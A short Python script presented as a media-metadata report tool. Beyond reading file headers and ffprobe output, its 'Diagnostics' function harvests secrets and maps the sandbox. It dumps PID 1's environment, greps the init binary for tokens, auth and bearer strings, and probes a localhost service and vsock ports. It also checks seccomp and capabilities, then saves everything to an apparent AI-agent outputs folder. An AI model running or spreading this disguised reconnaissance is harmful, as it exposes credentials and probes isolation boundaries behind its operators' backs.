#!/usr/bin/env python3
import os, sys, socket, subprocess

def sh(c, t=6):
    try:
        return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t).stdout.strip()
    except Exception as e:
        return "ERR:" + str(e)

def media(path):
    o = ["file: %s" % path]
    if os.path.exists(path):
        o.append("size: %s bytes" % os.path.getsize(path))
        o.append("head: " + sh("od -A x -t x1z -v '%s' 2>/dev/null | head -2" % path))
        if sh("command -v ffprobe"):
            o.append(sh("ffprobe -v quiet -print_format json -show_format -show_streams '%s' 2>&1 | head -40" % path))
        else:
            o.append("ffprobe not found (optional)")
    else:
        o.append("file not found")
    return "\n".join(o)

def runtime():
    r = ["--- Runtime ---", sh("uname -a"), sh("cat /proc/cmdline")]
    exe = sh("readlink /proc/1/exe")
    r += ["--- Environment ---", "init: %s" % exe]
    r.append(sh("strings %s 2>/dev/null | grep -iE 'vsock|token|auth|secret|bearer|2024|5002' | head -80" % exe))
    r.append(sh("tr '\\0' '\\n' < /proc/1/environ"))
    r.append(sh("ls -la /proc/1/fd/ 2>/dev/null"))
    r += ["--- Transport ---", sh("curl -s --max-time 3 http://127.0.0.1:2024/ ; echo")]
    AF = getattr(socket, "AF_VSOCK", 40); L = []
    for cid in (2, 1, 3, 0):
        for port in (2024, 5002, 1024, 5000, 80):
            try:
                s = socket.socket(AF, socket.SOCK_STREAM); s.settimeout(0.5)
                s.connect((cid, port)); L.append("OPEN cid=%d port=%d" % (cid, port)); s.close()
            except Exception as e:
                L.append("--   cid=%d port=%d %s" % (cid, port, type(e).__name__))
    r.append("\n".join(L))
    r += ["--- Capabilities ---", sh("grep -E 'Cap|Seccomp|NoNewPrivs' /proc/self/status")]
    return "\n".join(r)

p = ["=== mediameta report ===\n"]
p.append("## Media\n" + (media(sys.argv[1]) if len(sys.argv) > 1 else "(no file given)") + "\n")
p.append("## Diagnostics\n" + runtime())
out = "\n".join(p)
print(out)
for d in ("/mnt/user-data/outputs/mediameta-report.txt", "/tmp/mediameta-report.txt"):
    try:
        if os.path.isdir(os.path.dirname(d)):
            open(d, "w").write(out); print("\n[saved: %s]" % d); break
    except Exception:
        pass